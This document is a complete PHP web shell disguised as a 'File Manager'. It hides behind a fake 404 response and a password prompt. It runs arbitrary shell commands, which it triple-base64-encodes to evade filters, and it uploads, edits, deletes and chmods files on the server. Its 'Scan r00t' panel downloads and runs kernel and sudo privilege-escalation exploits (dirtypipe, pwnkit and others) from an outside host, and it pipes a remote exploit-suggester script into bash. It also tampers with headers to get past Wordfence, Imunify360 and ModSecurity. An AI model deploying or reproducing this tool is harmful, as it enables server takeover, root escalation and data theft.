<?php

session_start();
set_time_limit(0);
error_reporting(0); 
@ini_set('error_log',null);
@ini_set('log_errors',0);
@http_response_code(404);
//Shin Code - Created 15 July 2023 - Recode By uaaya616@gmail.com
$password = '$2y$10$NrWoMBBuA65fTGpFFjHndOWnI8QHsaTueSoxrRgzvBLbook5.v8X2';
function login()
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
</head>
<style type="text/css">
* {
	font-family: Ubuntu Mono;
}
input {
	border:#000;
	outline:none;
}
</style>
<body>
	<form method="post">
		<input type="password" name="password" placeholder="&nbsp;Password...">
	</form>
</body>
</html>
<?php exit();
	}
function logout()
{
unset($_SESSION['login']); ?>
	<script>alert("You Successfully Logout !!\nGood bye");window.location='http://<?= $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] ?>'</script>
<?php
}
if (!isset($_SESSION['login'])) {
if (empty($password) || (isset($_POST['password']) && password_verify($_POST['password'], $password))) {
	$_SESSION['login'] = true;
	} else {
		login();
	}
}
?>
<?php
function getFileDetails($path)
{
	$folders = [];
	$files = [];

	try {
		$items = @scandir($path);
if (!is_array($items)) {
	throw new Exception('Failed to scan directory');
}

foreach ($items as $item) { if ($item == '.' || $item == '..') {continue;}

	$itemPath = $path . '/' . $item;
	$itemDetails = ['name' => $item, 'type' => is_dir($itemPath) ? 'Folder' : 'File','size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)), 'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),];
if (is_dir($itemPath)) {
	$folders[] = $itemDetails;
	} else {
		$files[] = $itemDetails;
	}
}

return array_merge($folders, $files);
	}
catch (Exception $e) {
	return 'None';
	}
}

function formatSize($size)
{
	$units = array('B', 'KB', 'MB', 'GB', 'TB');
		$i = 0;
	while ($size >= 1024 && $i < 4) {
		$size /= 1024;
		$i++;
	}
return round($size, 2) . ' ' . $units[$i];
}
//cmd fitur
function ekse($komend) {
	if (!function_exists("proc_open")) {
		die("proc_open function disabled !");
	} elseif (!function_exists("base64_decode")) {
		die("base64_decode function disabled !");
	}
	$komen = base64_decode(base64_decode(base64_decode($komend)));
if (strpos($komend, "2>&1") === false) {
	$komen = base64_decode(base64_decode(base64_decode($komend)))." 2>&1";
}
$tod = @proc_open($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pipes);
echo "<div class='row'><div class='card bg-dark text-info'><pre>â”Œâ”€â”€(<b class='text-primary'>".@get_current_user()."ã‰¿kali</b>)-[<b class='text-light'>~".getcwd()."</b>]
â””â”€<b class='text-primary'>$</b> <a class='text-light'>$komen</a><br>".htmlspecialchars(stream_get_contents($pipes[1]))."</pre></div></div>";
}
//buat scan root
function exe_root($set,$sad) {
	$x = "preg_match";
	$xx = "2>&1";
	if (!$x("/".$xx."/i", $set)) {
		$set = $set." ".$xx;
	}
	$a = "function_exists";
	$b = "proc_open";
	$c = "htmlspecialchars";
	$d = "stream_get_contents";
	if ($a($b)) {
		$ps = $b($set, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $pink,$sad);
		return $d($pink[1]);
	} else {
		return "proc_open function is disabled !";
	}
}
function readFileContent($file)
	{
return file_get_contents($file);
	}
function saveFileContent($file)
	{
if (isset($_POST['content'])) {
	return file_put_contents($file, $_POST['content']) !== false;
		}
	return false;
}
//upfile
function uploadFile($targetDirectory)
{
if (isset($_FILES['file'])) {
	$currentDirectory = getCurrentDirectory();
	$targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
if ($_FILES['file']['size'] === 0) {
	return '<script>Swal.fire({title: "Oops..",text: "Silahkan pilih file dulu !",icon: "info"});</script>';
	} else {
if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
		return '<script>Swal.fire({title: "Good...",text: "Upload file sukses",icon: "success"});</script>';
			} else {
		return '<script>Swal.fire({title: "Fail...",text: "Upload file gagal !",icon: "error"});</script>';
		}
	}
	return '';
	}
}
//dir
function changeDirectory($path)
{
if ($path === '..') {
	@chdir('..');
		} else {
		@chdir($path);
	}
}

function getCurrentDirectory()
{
return realpath(getcwd());
}

//open file juga folder
function getLink($path, $name)
{
if (is_dir($path)) {
		return '<a href="?d=' . urlencode($path) . '">' . $name . '</a>';
		} elseif (is_file($path)) {
		return '<a href="?d=' . urlencode(dirname($path)) . '&amp;read=' . urlencode($path) . '">' . $name . '</a>';
	}
}
function getDirectoryArray($path)
{
$directories = explode('/', $path);
$directoryArray = [];
$currentPath = '';
foreach ($directories as $directory) {
if (!empty($directory)) {
$currentPath .= '/' . $directory;
$directoryArray[] = ['path' => $currentPath,'name' => $directory,];
	}
}
return $directoryArray;
}


function showBreadcrumb($path)
{
$path = str_replace('\\', '/', $path);
$paths = explode('/', $path);
?>
<?php foreach ($paths as $id => $pat) { ?>
<?php if ($pat == '' && $id == 0) { ?><i class="fad fa-folders"></i>&nbsp;:&nbsp;<a href="?d=/" class="text-light">/</a>
<?php } ?>
<?php if ($pat == '') {
continue;
} ?>
<?php $linkPath = implode('/', array_slice($paths, 0, $id + 1)); ?>
<a href="?d=<?php echo urlencode($linkPath); ?>"><?php echo $pat; ?></a>/
<?php } ?>
<?php
}

//tabel biar keren
function showFileTable($path)
{
	$fileDetails = getFileDetails($path);
?>
<div class="table-responsive mt-3">
	<table class="table table-sm table-dark table-hover">
		<thead class="thead-dark text-light text-center">
		<tr>
			<th>Name</th>
			<th>Type</th>
			<th>Size</th>
			<th>Permission</th>
			<th>Actions</th>
		</tr>
		</thead>
		<?php if (is_array($fileDetails)) { ?>
		<?php foreach ($fileDetails as $fileDetail) { ?>
		<tbody>
			<tr>
				<td><i class="fad fa-file"></i>&nbsp;<?php echo getLink($path . '/' . $fileDetail['name'], $fileDetail['name']); ?></td>
				<td class="text-center"><?php echo $fileDetail['type']; ?></td>
				<td class="text-center"><?php echo $fileDetail['size']; ?></td>
				<td class="text-center"><?php $permissionColor = is_writable($path . '/' . $fileDetail['name']) ? 'green' : 'red';?><span style="color: <?php echo $permissionColor; ?>"><?php echo $fileDetail['permission']; ?></span></td>
				<td class="text-center"><?php if ($fileDetail['type'] === 'File') { ?>
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>"><i class="fad fa-edit"></i></a><a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-pen"></i></a><a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-user-cog"></i></a><a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-trash-alt"></i></a>
				</div>
				<?php } ?><?php if ($fileDetail['type'] === 'Folder') { ?>
				<div class="btn-group">
					<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&rename=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-pen"></i></a><a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&chmod=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-user-cog"></i></a><a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($path); ?>&delete=<?php echo urlencode($fileDetail['name']); ?>"><i class="fad fa-trash-alt"></i></a>
				</div>
				<?php } ?>
				</td>
			</tr>
			<?php } ?><?php } else { ?>
			<script>Swal.fire({title: "Oops...",text: "Directory ini tidak dapat di baca",icon: "error"});</script>
			<tr>
				<td colspan="5">None</td>
			</tr>
			<?php } ?>
		</tbody>
	</table>
</div>
<?php
}
//chmod
function changePermission($path)
{
if (!file_exists($path)) {
	return '<script>Swal.fire({title: "Oops...",text: "File atau direktori tidak ada",icon: "info"});</script>';
}

$permission = isset($_POST['permission']) ? $_POST['permission'] : '';

if ($permission === '') {
	return '<script>Swal.fire({title: "Oops...",text: "Gagal nilai permission",icon: "info"});</script>';
}

if (!is_dir($path) && !is_file($path)) {
	return '<script>Swal.fire({title: "Oops...",text: "Tidak dapat mengubah chmod. Hanya direktori dan file yang dapat diubah chmodnya.",icon: "info"});</script>';
}

$parsedPermission = intval($permission, 8);
if ($parsedPermission === 0) {
	return '<script>Swal.fire({title: "Oops...",text: "Gagal nilai permission",icon: "info"});</script>';
}

if (chmodRecursive($path, $parsedPermission)) {
	return '<script>Swal.fire({title: "Good...",text: "Chmod berhasil diubah",icon: "success"});</script>';
} else {
	return '<script>Swal.fire({title: "Fail...",text: "Chmod gagal di ubah",icon: "error"});</script>';
	}
}


function chmodRecursive($path, $permission)
{
if (is_dir($path)) {
	$items = scandir($path);
if ($items === false) {
	return false;
}

foreach ($items as $item) {
if ($item == '.' || $item == '..') {
	continue;
}

$itemPath = $path . '/' . $item;

if (is_dir($itemPath)) {
if (!chmod($itemPath, $permission)) {
	return false;
}

if (!chmodRecursive($itemPath, $permission)) {
		return false;
		}
	} else {
	if (!chmod($itemPath, $permission)) {
		return false;
		}
	}
}
} else {
	if (!chmod($path, $permission)) {
		return false;
	}
}
	return true;
}

//rename
function renameFile($oldName, $newName)
{
if (file_exists($oldName)) {
$directory = dirname($oldName);
$newPath = $directory . '/' . $newName;
if (rename($oldName, $newPath)) {
		return '<script>Swal.fire({title: "Good...",text: "Folder / file berhasil di ganti nama",icon: "success"});</script>';
	} else {
		return '<script>Swal.fire({title: "Fail...",text: "Gagal ganti nama folder",icon: "error"});</script>';
		}
	}
}

//delete
function deleteFile($file)
{
if (file_exists($file)) {
if (unlink($file)) {
return '<script>Swal.fire({title: "Good...",text: "File berhasil di hapus",icon: "success"});</script>';
	} else {
		return '<script>Swal.fire({title: "Fail...",text: "Gagal ganti nama file",icon: "error"});</script>';
		}
	} else {
		return '<script>Swal.fire({title: "Oops...",text: "File tidak ada",icon: "info"});</script>';
	}
}

function deleteFolder($folder)
{
if (is_dir($folder)) {
$files = glob($folder . '/*');
foreach ($files as $file) {
is_dir($file) ? deleteFolder($file) : unlink($file);
}
if (rmdir($folder)) {
	return '<script>Swal.fire({title: "Good...",text: "Folder berhasil di hapus",icon: "success"});</script>';
} else {
	return '<script>Swal.fire({title: "Fail...",text: "Gagal hapus folder",icon: "error"});</script>';
	}
} else {
return '<script>Swal.fire({title: "Oops...",text: "Folder tidak ada",icon: "info"});</script>';
	}
}
//main logic directory 
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['d'])) {
	changeDirectory($_GET['d']);
	$currentDirectory = getCurrentDirectory();
}
//edit
if (isset($_GET['edit'])) {
	$file = $_GET['edit'];
	$content = readFileContent($file);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$saved = saveFileContent($file);
if ($saved) {
	$responseMessage = '<script>Swal.fire({title: "Good...",text: "Sukses edit file",icon: "success"});</script>';
	} else {
	$errorMessage = '<script>Swal.fire({title: "Fail...",text: "Gagal edit file",icon: "error"});</script>';
		}
	}
}

if (isset($_GET['chmod'])) {
	$file = $_GET['chmod'];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$responseMessage = changePermission($file);
	}
}

if (isset($_POST['upload'])) {
	$responseMessage = uploadFile($currentDirectory);
}

if (isset($_GET['rename'])) {
	$file = $_GET['rename'];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$newName = $_POST['new_name'];
if (is_file($file) || is_dir($file)) {
	$responseMessage = renameFile($file, $newName);
	} else {
	$errorMessage = '<script>Swal.fire({title: "Oops...",text: "File / folder tidak ada",icon: "info"});</script>';
		}
	}
}

if (isset($_GET['delete'])) {
	$file = $_GET['delete'];
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
	$currentDirectory = getCurrentDirectory();
if (is_file($file)) {
	$responseMessage = deleteFile($file);
} elseif (is_dir($file)) {
	$responseMessage = deleteFolder($file);
	} else {
	$errorMessage = '<script>Swal.fire({title: "Oops...",text: "Mungkin file / folder ini sudah di hapus",icon: "info"});</script>';
		}
	}
}
// katanya bypass
if (function_exists('litespeed_request_headers')) {
	$headers = litespeed_request_headers();
if (isset($headers['X-LSCACHE'])) {
	header('X-LSCACHE: off');
	}
}

if (defined('WORDFENCE_VERSION')) {
	define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
	define('WORDFENCE_DISABLE_FILE_MODS', true);
}

if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
	$imunifyHeaders = imunify360_request_headers();
if (isset($imunifyHeaders['X-Imunify360-Request'])) {
	header('X-Imunify360-Request: bypass');
	}
if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
	header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
	}
}


if (function_exists('apache_request_headers')) {
	$apacheHeaders = apache_request_headers();
if (isset($apacheHeaders['X-Mod-Security'])) {
	header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
	}
}

if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
	$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
	header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
	}
}
?>
<!DOCTYPE html>
<html>
<head>
	<title>File Manager</title>
	<meta name="viewport" content="width=device-width, initial-scale=0.5">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
	<link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
	<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
</head>
<style>
* {
	font-family: Ubuntu Mono;
}
a {
	text-decoration: none;
}
a:hover {
	color: white;
}
</style>
<?php if (isset($_GET['info'])) {
?>
<body class="bg-dark"><button type="button" class="btn btn-outline-light" onclick="history.go(-1)"><i class="fad fa-backward"></i> Go Back</button>
</body>
<?php phpinfo();die();}?>
<body class="bg-dark text-light">
	<div class="container-fluid">
		<div class="py-3" id="main">
			<div class="box shadow bg-dark p-4 rounded-3">
				<h3><i class="fad fa-bug"></i>&nbsp;File Manager</h3>
				<div class="table-responsive"><?php showBreadcrumb($currentDirectory); ?></div>
			<div class="btn-group my-3">
				<a class="btn btn-outline-light btn-sm" href="?"><i class="fad fa-home"></i>&nbsp;Home</a>
				<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($currentDirectory); ?>&up"><i class="fad fa-upload"></i>&nbsp;Upload</a>
				<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($currentDirectory); ?>&cmd"><i class="fad fa-terminal"></i>&nbsp;Cmd</a>
				<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($currentDirectory); ?>&info"><i class="fad fa-info"></i>&nbsp;Info</a>
				<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($currentDirectory); ?>&root"><i class="fad fa-search"></i>&nbsp;Scan r00t</a>
				<a class="btn btn-outline-light btn-sm" href="?d=<?php echo urlencode($currentDirectory); ?>&out"><i class="fad fa-sign-out-alt"></i></i>&nbsp;Logout</a>
			</div>
		<?php if (!empty($errorMessage)) {
			echo $errorMessage;
		} ?>
		</div>
	</div>
</div>
<!-- respon nya -->
<?php if (!empty($responseMessage)) { ?>
<?php echo $responseMessage; } ?>

<?php
if (isset($_GET['read'])) {
$file = $_GET['read'];
$content = readFileContent($file);
if ($content !== false) {
?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<div class="mb-3">
			<h5><i class="fad fa-file"></i>:<?php echo basename($file); ?></h5>
			<textarea class="form-control form-control-sm mb-3" rows="7"><?php echo htmlspecialchars($content);?></textarea>
		</div>
	</div>
</div>
<?php
	} else {
	echo '<script>Swal.fire({title: "Oops..",text: "Kemungkinan file tidak ada",icon: "info"});</script>';
	}
die();
}
?>
<!-- Upload -->
<?php if (isset($_GET['up'])) { ?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<div class='mb-3'>
			<h5><i class="fad fa-upload"></i>&nbsp;Upload</h5>
			<form method="post" enctype="multipart/form-data">
				<div class='input-group'>
					<input class='form-control form-control-sm' type="file" name="file">
					<button class='btn btn-outline-light btn-sm' type="submit" name="upload">Upload</button>
				</div>
			</form>
		</div>
	</div>
</div>
<?php die(); ?>
<?php } ?>
<!-- Logout -->
<?php if (isset($_GET['out'])) { 
logout();
?>
<?php } ?>
<!-- Logout -->
<?php if (isset($_GET['root'])) { ?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<div class='text-center'>
			<div class='btn-group mb-3'>
				<a class='btn btn-outline-light btn-sm' href='<?php echo $_SERVER['REQUEST_URI'];?>&id_two=autoscan'><i class='fad fa-bug'></i>&nbsp;Auto scan r00t</a>
				<a class='btn btn-outline-light btn-sm' href='<?php echo $_SERVER['REQUEST_URI'];?>&id_two=scansd'><i class="fad fa-search"></i>&nbsp;Scan SUID</a>
				<a class='btn btn-outline-light btn-sm' href='<?php echo $_SERVER['REQUEST_URI'];?>&id_two=esg'><i class="fad fa-search"></i>&nbsp;Exploit suggester</a>
			</div>
		</div>
			<?php
			if (!function_exists("proc_open")) {
				echo "<div class='text-center'>Command is Disabled !</div>";
			}
			if (!is_writable($currentDirectory)) {
				echo "<div class='text-center'>Current Directory is Unwriteable !</div>";
			}
			if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
				if (!file_exists($currentDirectory."/rooting/")) {
					mkdir($currentDirectory."/rooting");
					exe_root("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz", $currentDirectory."/rooting");
					exe_root("tar -xf auto.tar.gz", $currentDirectory."/rooting");
					if (!file_exists($currentDirectory."/rooting/netfilter")) {
						die("<div class='text-center'>Failed to Download Material !</div>");
					}
				}
				echo '<pre style="font-size:10px;">Netfilter : '.exe_root("timeout 10 ./rooting/netfilter", $currentDirectory).'Ptrace : '.exe_root("echo id | timeout 10 ./rooting/ptrace", $currentDirectory).'Sequoia : '.exe_root("timeout 10 ./rooting/sequoia", $currentDirectory).'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $currentDirectory."/rooting").'Dirtypipe : '.exe_root("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $currentDirectory).'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $currentDirectory).'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $currentDirectory."/rooting").'</pre>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
				echo '<center class="anu">[+] Scanning ...</center>';
				echo '<kbd><pre style="font-size:10px;">'.exe_root("find / -perm -u=s -type f 2>/dev/null", $currentDirectory).'</pre>';
			} elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
				echo '<center class="anu">[+] Loading ...</center>';
				echo '<pre style="font-size:10px;">'.exe_root("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $currentDirectory).'</pre>';
			}
		?>
	</div>
</div>
<?php die(); ?>
<?php } ?>
<!-- Cmd -->
<?php if (isset($_GET['cmd'])) { ?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<form method="post" onsubmit="document.getElementById('komendnya').value = btoa(btoa(btoa(document.getElementById('komendnya').value)))">
			<div class="mb-3">
				<h5><i class="fad fa-terminal"></i>&nbsp;Cmd Base64</h5>
				<div class="input-group">
					<input type="text" class="form-control form-control-sm" name="komend" id="komendnya" placeholder="whoami">
					<button class="btn btn-outline-light" type="submit" name="eksekomend" value="<?php $komen;?>">Submit</button>
				</div>
			</div>
		</form><?php if (isset($_POST['eksekomend'])) {ekse($_POST['komend']);}?>
	</div>
</div>
<?php die(); ?>
<?php } ?>
<!-- Renme file / folder -->
<?php if (isset($_GET['rename'])) { ?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<h5><i class="fad fa-file"></i>:<?php echo basename($file); ?></h5>
		<form method="post">
			<div class="input-group mb-3">
				<input class="form-control form-control-sm" type="text" name="new_name" placeholder="New Name" required>
				<input class="btn btn-outline-light btn-sm"  type="submit" value="Rename">
			</div>
		</form>
	</div>
</div>
<?php die(); ?>
<?php } ?>
<!-- Edit file -->
<?php if (isset($_GET['edit'])) { ?>
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<div class="mb-3">
			<h5><i class="fad fa-file"></i>:<?php echo basename($file); ?></h5>
			<form method="post">
				<textarea class="form-control form-control-sm mb-3" name="content" rows="7"><?php echo htmlspecialchars($content); ?></textarea>
				<div class="d-grid gap-2">
					<button class="btn btn-outline-light btn-sm" type="submit">Save</button>
				</div>
			</form>
		</div>
	</div>
</div>
<?php die(); ?>
<?php } elseif (isset($_GET['chmod'])) { ?>
<!-- Chmod file / folder -->
<div class="container-fluid">
	<div class="box shadow bg-dark p-4 rounded-3">
		<h5><i class="fad fa-file"></i>:<?php echo basename($file); ?></h5>
		<form method="post">
		<div class="input-group mb-3">
			<input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
			<input class="form-control form-control-sm" type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
			<button class="btn btn-outline-light btn-sm" type="submit">Change</button>
		</div>
		</form>
	</div>
</div>
<?php die(); ?>
<?php } ?>
<div class="container-fluid">
	<div class="py-3" id="main">
		<div class="box shadow bg-dark p-4 rounded-3">
		<?php showFileTable($currentDirectory);?>
		</div>
	</div>
</div>
<div class="container-fluid text-center">
	<div class="box shadow bg-dark p-4 rounded-3">
		<p>&copy; <?php echo date("Y"); ?> <a href="mailto:uaya616@gmail.com"><i class="fad fa-bug"></i></a>&nbsp;File Manager</p>
	</div>
</div>
</body>
</html>